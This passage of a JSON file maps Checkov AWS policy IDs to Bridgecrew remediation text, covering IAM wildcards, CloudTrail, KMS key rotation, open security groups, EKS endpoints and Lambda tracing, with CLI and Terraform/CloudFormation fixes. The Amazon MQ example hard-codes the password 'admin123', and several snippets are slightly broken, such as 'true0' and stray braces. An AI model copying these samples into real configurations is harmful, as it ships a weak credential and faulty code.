'AWS::IAM::Role'\n    Properties:\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              \"AWS\":\n-               - \"*\"\n",
        "severity": "HIGH"
    },
    "CKV_AWS_61": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_iam_45",
        "description": "AWS IAM policy does allow assume role permission across all services\nDescription\nThe IAM role is an identity with specific permissions. An IAM role is similar to an IAM user, it is an AWS identity with permission policies that determine what the identity can and cannot do in AWS. When a user assumes a role, it provides temporary security credentials for a bounded session.\nWe recommend that you define fine-grained roles for specific services or principles. For example, when settings up an AWS service role it is recommended to include only the permissions required for the service to access the AWS resources required. Alternatively, you can use a Principal as an entity in AWS that can perform actions and access resources. The main benefit of the Principal entity is to limit the use of wildcards in the policy document.\nFix - Buildtime\nCloudFormation\n\nResource: AWS::IAM::Role\nArgument: Properties.AssumeRolePolicyDocument.Statement\n\nYAMLResources:\n  ExecutionRole:\n      Type: AWS::IAM::Role\n      Properties:\n        ...\n        AssumeRolePolicyDocument:\n          ...\n          Statement:\n          - Effect: \"Allow\"\n            Principal:\n                AWS:\n-                 - arn:aws:iam::123456789101:root\n-                                   - 123456789101\n",
        "severity": "HIGH"
    },
    "CKV_AWS_CUSTOM_1": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_26",
        "description": "AWS resources that support tags do not have Tags\nDescription\nMany different types of AWS resources support tags. Tags allow you to add metadata to a resource to help identify ownership, perform cost / billing analysis, and to enrich a resource with other valuable information, such as descriptions and environment names. While there are many ways that tags can be used, we recommend you follow a tagging practice.\nView AWS's recommended tagging best practices here.\nFix - Runtime \nAWS Console\nThe procedure varies by resource type. Tags can be added in the AWS console by navigating to the specific resource. There is usually a \"tags\" tab in the resource view that can be used to view and modify tags.\nExample to edit tags for a Security Group:\n\nNavigate to the Amazon EC2 console.\nSelect Security groups\nSelect a security group to edit, then click the Tags tab.\nClick Manage tags, then Add new tag to add a tag.\nClick Save changes.\n\nCLI Command\nThe following command shows how to add tags for any resource associated with the EC2 service (in this case, a security group). The specific command varies by resource type for non-EC2 services (e.g., RDS).\naws ec2 create-tags --resources sg-000b51bf43c710838 --tags Key=Environment,Value=Dev\nFix - Buildtime \nTerraform\nThe example below shows how to tag a security group in Terraform. The syntax is generally the same for any taggable resource type.\nGoresource \"aws_security_group\" \"sg\" {\n  name = \"my-sg\"\n  ...\n+ tags = {\n+   Environment = \"dev\"\n+   Owner = \"apps-team\"\n+ }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_72": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_iam_46",
        "description": "SQS policy documents allow * (asterisk) as a statement's action\nDescription\nThe Action element describes the specific action or actions that will be allowed or denied. Statements must include either an Action or NotAction element. Each AWS service has its own set of actions that describe tasks that can be performed with that service. Specify a value using a namespace that identifies a service, for example, iam, ec2 sqs, sns, s3, followed by the name of the action to be allowed or denied. The name must match an action that is supported by the service.\nWe recommend you do not allow \"*\" (all resource) statements as part of action elements. This level of access could potentially grant unwanted and unregulated access to anyone given this policy document setting. We recommend you to write a refined policy describing the specific action allowed or required by the specific policy holder.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon SQS console.\nClick on the queue you want to modify.\nClick on the \"Access Policy\" tab within the queue's details page.\nClick \"edit\" next to the displayed \"Access Policy\".\nIdentify any Action statements permitting actions access to all resources (\"*\").\nNarrow the scope to necessary actions, for example sqs:SendMessage\nClick Save.\n\nFix - Buildtime \nTerraform\n\nArgument: statement\nAttribute: action \n\naws_iam_policyresource \"aws_sqs_queue_policy\" \"example\" {\n  queue_url = aws_sqs_queue.q.id\n\n  policy = <<POLICY\n  {\n  \"Version\": \"2012-10-17\",\n  \"Id\": \"sqspolicy\",\n  \"Statement\": [\n      {\n      \"Sid\": \"First\",\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"sqs:SendMessage\",\n      \"Resource\": \"${aws_sqs_queue.q.arn}\",\n      \"Condition\": {\n          \"ArnEquals\": {\n          \"aws:SourceArn\": \"${aws_sns_topic.example.arn}\"\n          }\n      }\n      }\n  ]\n  }\n  POLICY\n  }\n",
        "severity": "HIGH"
    },
    "CKV_AWS_67": {
        "url": "https://docs.bridgecrew.io/docs/logging_1",
        "description": "AWS CloudTrail is not enabled in all regions\nDescription\nAWS CloudTrail is a web service that records AWS API calls for your account and delivers log files to you. The recorded information includes: the identity of the API caller, the time of the API call, the source IP address of the API caller, the request parameters, and the response elements returned by the AWS service. CloudTrail provides a history of AWS API calls for an account, including API calls made via the Management Console, SDKs, command line tools, and higher-level AWS services such as CloudFormation. \nThe AWS API call history produced by CloudTrail enables security analysis, resource change tracking, and compliance auditing. AWS CloudTrail provides additional multi-region security:\n\nEnsuring that a multi-regions trail exists will detect unexpected activity occurring in otherwise unused regions. \nEnsuring that a multi-regions trail exists will enable Global Service Logging for a trail by default, capturing records of events generated on AWS global services. \nFor a multi-regions trail, ensuring that management events are configured for all types of Read/Write operations, results in the recording of management actions performed on all resources in an AWS account. \n\nFix - Runtime \nAWS Console\nTo enable global (multi-region) CloudTrail logging, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Cloudtrail dashboard.\nOn the left navigation pane, click Trails.\nClick Get Started Now.\nClick Add new trail .\nEnter a trail name in the Trail name box. \nSet Apply trail to all regions option to Yes. \nEnter an S3 bucket name in the S3 bucket box. \nClick Create. \n\nIf one or more trail already exist, select the target trail to enable global logging, using the following steps: \n\nNext to Apply trail to all regions, click the edit icon (pencil) and select Yes.\nClick Save.\nNext to Management Events, click the edit icon (pencil) and select All Read/Write Events.\nClick Save. \n\nCLI Command\nTo create a multi-region trail, use the following command:\nBashaws cloudtrail create-trail \n--name <trail_name> \n--bucket-name <s3_bucket_for_cloudtrail> \n--is-multi-region-trail aws cloudtrail update-trail \n--name <trail_name> \n--is-multi-region-trail \n\n\ud83d\udcd8NoteCreating a CloudTrail with a CLI command, without providing any overriding options, configures Read/Write Management Events to All.\nFix - Buildtime\nCloudFormation\n\nResource:  AWS::CloudTrail::Trail\nArgument: Properties.IsMultiRegionTrail\n\nYAMLResources: \n  MyTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties: \n      ...\n+     IsMultiRegionTrail: True\n\nFix - Buildtime \nTerraform\n\nResource: aws_cloudtrail\nArgument: is_multi_region_trail - (Optional) Specifies whether the trail is created in the current region or in all regions. Defaults to false.\n\n\nGoresource \"aws_cloudtrail\" \"foobar\" {\n  name                          = \"tf-trail-foobar\"\n  s3_bucket_name                = aws_s3_bucket.foo.id\n  s3_key_prefix                 = \"prefix\"\n  include_global_service_events = false\n+ is_multi_region_trail = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_35": {
        "url": "https://docs.bridgecrew.io/docs/logging_7",
        "description": "AWS CloudTrail logs are not encrypted using CMKs\nDescription\nAWS CloudTrail is a web service that records AWS API calls for an account, and makes those logs available to users and resources in accordance with IAM policies. AWS Key Management Service (KMS) is a managed service that helps create and control the encryption keys used to encrypt account data. It uses Hardware Security Modules (HSMs) to protect the security of encryption keys. CloudTrail logs can be configured to leverage server-side encryption (SSE) and KMS customer created master keys (CMK) to further protect CloudTrail logs. \nWe recommend that CloudTrail logs are configured to use SSE-KMS, providing additional confidentiality controls on log data. A given user must have S3 read permission on the corresponding log bucket and must be granted decrypt permission by the CMK policy.\nFix - Runtime \nAWS Console\nTo configure CloudTrail to use SSE-KMS using the Management Console, follow these steps:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon CloudTrail console.\nIn the left navigation pane, click Trails. \nSelect a Trail. \nNavigate to the S3 section, click the edit button (pencil icon). \nClick Advanced. \nFrom the KMS key Id drop-down menu, select an existing CMK. \n\n\ud83d\udcd8NoteEnsure the CMK is located in the same region as the S3 bucket.\n\nFor CloudTrail as a service to encrypt and decrypt log files using the CMK provided, apply a KMS Key policy on the selected CMK. \nClick Save. \nYou will see a notification message stating that you need to have decrypt permissions on the specified KMS key to decrypt log files. Click Yes.\n\nCLI Command\nTo update the CloudTrail, use the following command:\nBashaws cloudtrail update-trail \n--name <trail_name> \n--kms-id <cloudtrail_kms_key> aws kms put-key-policy \n--key-id <cloudtrail_kms_key> \n--policy <cloudtrail_kms_key_policy>\n\nFix - Buildtime\nCloudFormation\n\nResource:  AWS::CloudTrail::Trail\nArgument: Properties.KMSKeyId\n\nYAMLResources:\n    myTrail: \n    Type: AWS::CloudTrail::Trail\n        Properties: \n            ...\n+           KMSKeyId: alias/MyAliasName\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_7": {
        "url": "https://docs.bridgecrew.io/docs/logging_8",
        "description": "AWS CMK rotation is not enabled\nDescription\nAWS Key Management Service (KMS) allows customers to rotate the backing key. This is where key material is stored within the KMS, and tied to the key ID of the Customer Created customer master key (CMK). The backing key is used to perform cryptographic operations such as encryption and decryption. Automated key rotation currently retains all prior backing keys, allowing decryption of encrypted data to take place transparently. \nWe recommend you enable CMK key rotation to help reduce the potential impact of a compromised key. Data encrypted with a new key cannot be accessed with a previous key, that may have been exposed.\nFix - Runtime \nAWS Console\nProcedure:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon KMS console. \nIn the left navigation pane, select customer managed keys.\nSelect the customer master key (CMK) in scope.\nNavigate to the Key Rotation tab.\nSelect Rotate this key every year.\nClick Save.\n\nCLI Command\nChange the policy to enable key rotation using CLI command:\nBashaws kms enable-key-rotation --key-id <kms_key_id>\n\nFix - Buildtime \nTerraform\n\nResource: aws_kms_key\nArgument: enable_key_rotation - (Optional) Specifies whether key rotation is enabled. Defaults to false.\n\naws_kms_keyresource \"aws_kms_key\" \"kms_key_1\" {\n  ...\n  is_enabled              = true\n+ enable_key_rotation    = true\n}\n\nCloudFormation\n\nResource: AWS::KMS::Key\nAttribute: EnableKeyRotation - (Optional) Specifies whether key rotation is enabled. Defaults to false.\n\nYAMLType: AWS::KMS::Key\nProperties: \n  ...\n+ EnableKeyRotation: true0\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_48": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_10",
        "description": "Amazon MQ Broker logging is not enabled\nDescription\nAmazon MQ is a broker service built on Apache ActiveMQ. As a message broker, MQ allows applications to communicate using various programming languages, operating systems and formal messaging protocols.\nAmazon MQ is integrated with CloudTrail and provides a record of the Amazon MQ calls made by a user, role, or AWS service. It supports logging both the request parameters and the responses for APIs as events in CloudTrail. Logging MQ ensures developers can trace all requests and responses, and ensure they are only used for their predefined message brokering settings.\nWe recommend you enable Amazon MQ Broker Logging.\nFix - Buildtime\nTerraform\nGoresource \"aws_mq_broker\" \"enabled\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.16.3\"\n  host_instance_type = \"mq.t3.micro\"\n\n  user {\n    password = \"admin123\"\n    username = \"admin\"\n  }\n\n  logs {\n    general = true\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_65": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_11",
        "description": "Container insights are not enabled on ECS cluster\nDescription\nContainer Insights can be used to collect, aggregate, and summarize metrics and logs from containerized applications and microservices. They can also be extended to collect metrics at the cluster, task, and service levels. Using Container Insights allows you to monitor, troubleshoot, and set alarms for all your Amazon ECS resources. It provides a simple to use native and fully managed service for managing ECS issues.\nWe recommend that for existing clusters you use the AWS CLI; and for new clusters, you use either the Amazon ECS console, or the AWS CLI.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon ECS console.\nIn the navigation pane, choose Account Settings.\nTo enable the Container Insights default opt-in, check the box at the bottom of the page.\n\nCLI Command\nYou can use the AWS CLI to set account-level permission to enable Container Insights for any new Amazon ECS clusters created in your account. To do so, enter the following command.\naws ecs put-account-setting \n--name \"containerInsights\" \n--value \"enabled\"\n\nFix - Buildtime \nTerraform\n\nResource: aws_ecs_cluster\nArgument: setting\n\naws_ecs_clusterresource \"aws_ecs_cluster\" \"foo\" {\n  ...\n  name = \"white-hart\"\n+ setting {\n+   name  = \"containerInsights\"\n+   value = \"enabled\"\n+ }\n}\n\nCloudFormation\n\nResource: AWS::ECS::Cluster\nArgument: Properties.ClusterSettings\n\nYAMLResources:\n  ECSCluster:\n    Type: 'AWS::ECS::Cluster'\n    Properties:\n      ...\n+     ClusterSettings:\n+       - Name: 'containerInsights'\n+         Value: 'enabled'\n",
        "severity": "LOW"
    },
    "CKV_AWS_14": {
        "url": "https://docs.bridgecrew.io/docs/iam_7",
        "description": "AWS IAM password policy does not have a symbol\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one symbol, this increases security, especially from a brute force attack.\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\ngo\nTo manually set the password policy with a minimum length, follow these steps:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSelect Require at least one non-alphanumeric character. \nClick Apply password policy.\n\nCLI Command\nTo change the password policy, use the following command:\nBashaws iam update-account-password-policy --require-symbols\n\nFix - Buildtime\nTerraform\nGoresource \"aws_iam_account_password_policy\" \"strict\" {\n  minimum_password_length        = 8\n  require_lowercase_characters   = true\n  require_numbers                = true\n  require_uppercase_characters   = true\n  require_symbols                = true\n  allow_users_to_change_password = true\n}\n\n\ud83d\udcd8NoteAll commands starting with aws iam update-account-password-policy can be combined into a single command.",
        "severity": "MEDIUM"
    },
    "CKV_AWS_34": {
        "url": "https://docs.bridgecrew.io/docs/networking_32",
        "description": "CloudFront distribution ViewerProtocolPolicy is not set to HTTPS\nDescription\nAWS::CloudFront::Distribution ViewerCertificate determines the distribution\u2019s SSL/TLS configuration for communicating with viewers. \nWe recommend you use the ViewerProtocolPolicy parameter to enable secure HTTPS communication between clients and your CloudForamtion templates. Most browsers and clients released after 2010 support server name indication.\nAWS recommends to accept HTTPS connections only from viewers that support SNI and advises against receiving HTTPS connections from all viewers, including those that do not support SNI, set SslSupportMethod. This also results in additional monthly charges from CloudFront.\nFix - Runtime \nProcedure\nUse ViewerProtocolPolicy in the CacheBehavior or DefaultCacheBehavior, and select Redirect HTTP to HTTPS or HTTPS Only.\nTo specify how CloudFront should use SSL/TLS to communicate with your custom origin, use CustomOriginConfig.\nFix - Buildtime \nTerraform\n\nResource:  aws_cloudfront_distribution\nArgument:  viewer_protocol_policy under default_cache_behavior or ordered_cache_behavior must not be allow-all. Acceptable values are redirect-to-https or https-only.\n\nGoresource \"aws_cloudfront_distribution\" \"cloudfront\" {\n  ...\n  default_cache_behavior {\n    ...\n    target_origin_id       = \"my-origin\"\n -  viewer_protocol_policy = \"allow-all\"\n +  viewer_protocol_policy = \"redirect-to-https\"\n  }\n}\n\nCloudFormation\n\nResource:  AWS::CloudFront::Distribution\nArgument:  ViewerProtocolPolicy under Properties.DefaultCacheBehavior or Properties.CacheBehaviors must not be allow-all. Acceptable values are redirect-to-https or https-only.\n\nYAMLResources:\n    CloudFrontDistribution:\n    Type: 'AWS::CloudFront::Distribution'\n    Properties:\n      DistributionConfig:\n        ...\n        DefaultCacheBehavior:\n          ...\n-         ViewerProtocolPolicy: 'allow-all'\n+         ViewerProtocolPolicy: 'https-only' # or 'redirect-to-https'\n\n        CacheBehaviors:\n          - TargetOriginId: customorigin\n                        ...\n-           ViewerProtocolPolicy: allow-all\n+           ViewerProtocolPolicy: https-only # or redirect-to-https\n",
        "severity": "HIGH"
    },
    "CKV_AWS_24": {
        "url": "https://docs.bridgecrew.io/docs/networking_1-port-security",
        "description": "AWS Security Group allows all traffic on SSH port 22\nDescription\nSecurity groups are stateful and provide filtering of ingress/egress network traffic to AWS resources. We recommend that security groups do not allow unrestricted ingress access to port 22. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk.\nFix - Runtime \nAWS Console\nTo implement the prescribed state, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon VPC console.\nIn the left pane, click Security Groups. \nFor each security group, perform the following:\na) Select the security group.\nb) Click Inbound Rules.\nc) Identify the rules to be removed.\nd) Click X in the Remove column.\nClick Save.\n\nCLI Command\n\nReview the rules for an existing security group (Replacing the security group ID and region).\n\nShellaws ec2 describe-security-groups\n--group-ids sg-xxxxxxxxxxxxxxxxx\n--region us-east-1\n\n\nReview and EC2 instances using the security group.\n\nShellaws ec2 describe-instances\n--filters Name=instance.group-id,Values=sg-xxxxxxxxxxxxxxxxx\n--region us-east-1\n\nFix - Buildtime\nTerraform\n\nResource: aws_security_group\nArgument:\n\naws_security_group.tfresource \"aws_security_group\" \"example\" {\n...\ningress {\n    cidr_blocks = [\n-     \"0.0.0.0/0\"\n+     \"10.0.0.1/32\"\n    ]\n    from_port = 22\n    to_port = 22\n    protocol = \"tcp\"\n  }\n}\n\nCloudFormation\n\nResource: AWS::EC2::SecurityGroup\nArgument: Properties.SecurityGroupIngress\n\nYAMLType: AWS::EC2::SecurityGroup\n    Properties:\n      ...\n      SecurityGroupIngress:\n      - Description: SSH Ingress\n        IpProtocol: tcp\n        FromPort: 22\n        ToPort: 22\n-       CidrIp: \"0.0.0.0/0\"\n+       CidrIp: \"10.10.10.0/24\"\n",
        "severity": "LOW"
    },
    "CKV_AWS_25": {
        "url": "https://docs.bridgecrew.io/docs/networking_2",
        "description": "Security Groups allow ingress from 0.0.0.0/0 to port 3389\nDescription\nSecurity groups are stateful and provide filtering of ingress/egress network traffic to AWS resources. We recommend that security groups do not allow unrestricted ingress access to port 3389. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk. \nRationale\nRemoving unfettered connectivity to remote console services, such as RDP, reduces a server's exposure to risk.\nFix - Runtime\nAWS Console\nTo implement the prescribed state, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon VPC console.\nIn the left pane, click Security Groups. \nFor each security group, perform the following:\na) Select the security group.\nb) Click Inbound Rules.\nc) Identify the rules to be removed.\nd) Click X in the Remove column.\nClick Save.\n\nFix - Buildtime\nTerraform\nThe issue is the CIDR specified in the ingress control rule - \"0.0.0.0/0\". Change it from this:\naws_security_group.tfresource \"aws_security_group\" \"example\" {\n  ...\n  ingress {\n    from_port   = 3389\n    to_port     = 3389\n    protocol    = \"tcp\"\n-   cidr_blocks = [\"0.0.0.0/0\"]\n+   cidr_blocks = [\"10.0.0.1/32\"]\n  }  \n}\n\nCloudFormation\n\nResource: AWS::EC2::SecurityGroup\nArgument: Properties.SecurityGroupIngress\n\nYAMLType: AWS::EC2::SecurityGroup\n    Properties:\n      ...\n      SecurityGroupIngress:\n      - Description: SSH Ingress\n        IpProtocol: tcp\n        FromPort: 3389\n        ToPort: 3389\n-       CidrIp: \"0.0.0.0/0\"\n+       CidrIp: \"10.10.10.0/24\"\n",
        "severity": "LOW"
    },
    "CKV_AWS_235": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-copied-amis-are-encrypted",
        "description": "AWS copied AMIs are not encrypted\nDescription\nAs a best practice enable encryption for your AWS copied AMIs to improve data security without making changes to your business or applications.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_ami_copy\" \"pass\" {\n  name              = \"terraform-example\"\n  description       = \"A copy of ami-xxxxxxxx\"\n  source_ami_id     = \"ami-xxxxxxxx\"\n  source_ami_region = \"us-west-1\"\n  encrypted         = true\n  tags = {\n    Name = \"HelloWorld\"\n    test = \"failed\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_2": {
        "url": "https://docs.bridgecrew.io/docs/networking_29",
        "description": "ALB protocol is not HTTPS\nDescription\nAn internet-facing AWS ELB/ALB is a public resource on your network that is completely exposed to the internet. It has a publicly resolvable DNS name, that can accept HTTP(S) requests from clients over the Internet. External actors gaining knowledge to this information can potentially attempt to access the EC2 instances that are registered with the load balancer.\nWhen an AWS ALB has no HTTPS listeners, front-end connections between the web clients and the load balancer could become targeted by man-in-the-middle attacks and traffic interception techniques.\nFix - Runtime \nAWS Console\n\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\n\n\nOpen the Amazon EC2 console.\n\n\nNavigate to LOAD BALANCING, select Load Balancers.\n\n\nSelect a load balancer, then select Listeners. \n\n\nTo add a listener, select Add Listener. \n\nFor Protocol : port, select HTTPS and keep the default port or type a different port.\nFor Default actions, do one of the following:\n\u2022\tChoose Add action, Forward to and choose a target group.\n\u2022\tChoose Add action, Redirect to and provide the URL for the redirect.\n\u2022\tChoose Add action, Return fixed response and provide a response code and optional response body.\nTo save the action, select the checkmark icon.\nFor Security policy, it is recommended that you keep the default security policy.\nFor Default SSL certificate, do one of the following:\n\u2022\tIf you created or imported a certificate using AWS Certificate Manager, select From ACM and select the certificate.\n\u2022\tIf you uploaded a certificate using IAM, select From IAM and select the certificate.\n\n\n\nClick Save.\n\n\nFix - Buildtime\nCloudFormation\n\nResource:  AWS::ElasticLoadBalancingV2::Listener\nArguments: Properties.Protocol / Properties.DefaultActions\n\nYAMLResources:\n    ListenerHTTPS:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      ...\n      # Option 1:\n+     Protocol: HTTPS # Or TCP / TLS / UDP / TCP_UDP\n      # Option 2:\n+     DefaultActions:\n+       - Type: redirect\n+         RedirectConfig:\n+           Protocol: HTTPS\n            ...\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_23": {
        "url": "https://docs.bridgecrew.io/docs/networking_31",
        "description": "Not every Security Group rule has a description\nDescription\nDescriptions can be up to 255 characters long and can be set and viewed from the AWS Management Console, AWS Command Line Interface (CLI), and the AWS APIs.\nWe recommend you add descriptive text to each of your Security Group Rules clarifying each rule's goals, this helps prevent developer errors.  \nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon VPC console.\nSelect Security Groups.\nSelect Create Security Group.\nSelect a Security Group and review all of the descriptions.\nTo modify the rules and descriptions, click Edit.\n\nFix - Buildtime\nTerraform\nAdd a description to your ingress or egress rule.\naws_security_group.examplea.tfresource \"aws_security_group\" \"examplea\" {\n  name        = var.es_domain\n  description = \"Allow inbound traffic to ElasticSearch from VPC CIDR\"\n  vpc_id      = var.vpc\n\n\n  ingress {\n    cidr_blocks = [\"10.0.0.0/16\"]\n   + description = \"What does this rule enable\"\n    from_port   = 80\n    protocol    = \"tcp\"\n    to_port     = 80\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_38": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_kubernetes_1",
        "description": "AWS EKS cluster security group overly permissive to all traffic\nDescription\nAmazon EKS creates an endpoint for any managed Kubernetes API server to communicate with the cluster. By default, this API server endpoint is public to the internet. Access to it should be regulated using AWS IAM and native Kubernetes RBAC.\nWe recommend that your Kubernetes API server remains private so that all communication between worker nodes and APIs stays within your VPC. If public access is needed, at a minimum, restrict the IP addresses that can access your API server from the internet to reduce the potential attack surface. Ensure your Amazon EKS public endpoint is not accessible to 0.0.0.0/0.\nFix - Runtime\nAmazon Console\n\nLogin to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon EKS console.\nTo display your cluster information, select the cluster's name.\nNavigate to Networking, select Update.\nSelect Private Access or Public Access.\nPrivate access. Select whether to enable or disable private access for your cluster's Kubernetes API server endpoint. If you enable private access, Kubernetes API requests that originate from within your cluster's VPC use the private VPC endpoint. You must enable private access to disable public access.\nPublic access. Select whether to enable or disable public access for your cluster's Kubernetes API server endpoint. If you disable public access, your cluster's Kubernetes API server can only receive requests from within the cluster VPC.\nClick Advanced Settings.\nTo enter a CIDR block or add additional blocks, select Add Source. If you specify no blocks, the public API server endpoint receives requests from all (0.0.0.0/0) IP addresses.\nTo finish, click Update.\n\nFix - Buildtime\nTerraform\nResource: aws_eks_cluster\nArgument: endpoint_public_access, public_access_cidrs\nGo##Option 1\nresource \"aws_eks_cluster\" \"disabled\" {\n  name     = \"example\"\n  role_arn = \"aws_iam_role.arn\"\n\n  vpc_config {\n    subnet_ids = [\"subnet-12345\"]\n\n    endpoint_public_access = False\n  }\n\n##Option 2:\nresource \"aws_eks_cluster\" \"restricted\" {\n  name     = \"example\"\n  role_arn = \"aws_iam_role.arn\"\n\n  vpc_config {\n    subnet_ids = [\"subnet-12345\"]\n\n    public_access_cidrs = [\"10.0.0.0/16\"]\n  }\n}\n}\n",
        "severity": "HIGH"
    },
    "CKV_AWS_39": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_kubernetes_2",
        "description": "AWS EKS cluster endpoint access is publicly enabled\nDescription\nAmazon EKS creates an endpoint for any managed Kubernetes API server to communicate with the cluster. This API server endpoint is public to the internet by default. Access to it should be regulated using AWS IAM and native Kubernetes RBAC.\nWe recommended that your Kubernetes API server remains private so that all communication between worker nodes and APIs stays within your VPC. If public access is needed, restrict the IP addresses that can access your API server from the internet to reduce the potential attack surface.\nFix - Runtime\nAmazon Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon EKS console.\nChoose the name of the cluster to display your cluster information.\nUnder Networking, click Update.\nFor Private access, disable private access for your cluster's Kubernetes API server endpoint. You must enable private access to disable public access.\n\nFix - Buildtime\nTerraform\nGoresource \"aws_eks_cluster\" \"disabled\" {\n  name     = \"example\"\n  role_arn = \"aws_iam_role.arn\"\n\n  vpc_config {\n    subnet_ids = [\"subnet-12345\"]\n\n    endpoint_public_access = False\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_58": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_kubernetes_3",
        "description": "AWS EKS cluster does not have secrets encryption enabled\nDescription\nSecrets in Kubernetes enables managing sensitive information such as passwords and API keys using Kubernetes-native APIs. When creating a secret resource the Kubernetes API server stores it in etcd in a base64 encoded form. For example, using kubectl create secret, EKS can encrypt etcd volumes at disk-level using AWS-managed encryption keys.\nAWS encourages using envelope encryption to encrypt a key with another key. The motivation is security best practice. Applications store sensitive data as part of a defense in depth security strategy. A master key is stored in AWS KMS that is then utilized for data key generation in the Kubernetes API server. It is also used to encrypt/decrypt sensitive data stored in Kubernetes secrets.\nFix - Buildtime\nCloudFormation\nResource: AWS::EKS::Cluster\nArgument: Properties.EncryptionConfig.Resources.secrets\nYAMLResources:\n  myCluster:\n    Type: 'AWS::EKS::Cluster'\n    Properties:\n      ...\n      EncryptionConfig:\n        - Resources:\n+         - secrets\n",
        "severity": "LOW"
    },
    "CKV_AWS_37": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_kubernetes_4",
        "description": "AWS EKS control plane logging is disabled\nDescription\nAmazon EKS control plane logging provides valuable diagnostic logs for all control plane related actions. Logging streams include cover for the following modules:\n\nKubernetes API server component logs (api)\u201a see kube-apiserver in the Kubernetes documentation.\nAudit (audit). Kubernetes audit logs provide a record of the individual users, administrators, or system components that have affected your cluster. For more information, see Auditing in the Kubernetes documentation.\nAuthenticator (authenticator). For more information, see authorization in the Kubernetes documentation.\nController manager (controllerManager). For more information, see kube-controller-manager in the Kubernetes documentation.\nScheduler (scheduler). For more information, see kube-scheduler in the Kubernetes documentation.\n\nAmazon EKS control plane logging is used to detect anomalous configuration activity by your customer. It is used to track configuration changes conducted manually and programmatically, and trace back unapproved changes.\nFix - Runtime \nAWS Console\nTo enable Amazon EKS logging, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon EKS console.\nTo display your cluster information, select the cluster's name.\nNavigate to Logging and click Update.\nFor each individual log stream, select if the log type should be Enabled.\nClick Update.\n\nFix - Buildtime\nTerraform\nThe code below enables control plane logging.\nResource: aws_eks_cluster\nAttributes: enabled_cluster_log_types\naws_eks_cluster.pike.tfresource \"aws_eks_cluster\" \"pike\" {   \n  name_prefix= var.name\n  role_arn = aws_iam_role.pike\n  vpc_config {\n    endpoint_public_access = false\n    subnet_ids = var.subnet_ids\n  }\n\n  tags = {\n    pike=\"permissions\"\n  }\n  encryption_config {\n    resources = [\"secrets\"]\n  }\n+  enabled_cluster_log_types = [\"api\", \"audit\", \"authenticator\",\"controllerManager\",\"scheduler\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_50": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_serverless_4",
        "description": "AWS Lambda functions with tracing not enabled\nDescription\nX-Ray tracing in lambda functions allows you to visualize and troubleshoot errors and performance bottlenecks, and investigate requests that resulted in an error.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon Lambda console.\nOpen the function to modify.\nClick the Configuration tab.\nOpen the Monitoring and operations tools on the left side.\nClick Edit.\nEnable Active tracing for AWS X-ray.\nClick Save.\n\nCLI Command\nTo enable X-Ray tracing for a function, use the following command:\naws lambda update-function-configuration --function-name MY_FUNCTION \\\n--tracing-config Mode=Active\n\nFix - Buildtime \nTerraform\nAdd the following block to a Terraform Lambda resource to add X-Ray tracing:\nGotracing_config {\n  mode = \"Active\"\n}\n\nCloudFormation\nFor CloudFormation, use the following block under Properties:\nYAML\"TracingConfig\": {\n  \"Mode\": \"Active\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_3": {
        "url": "https://docs.bridgecrew.io/docs/general_3-encrypt-ebs-volume",
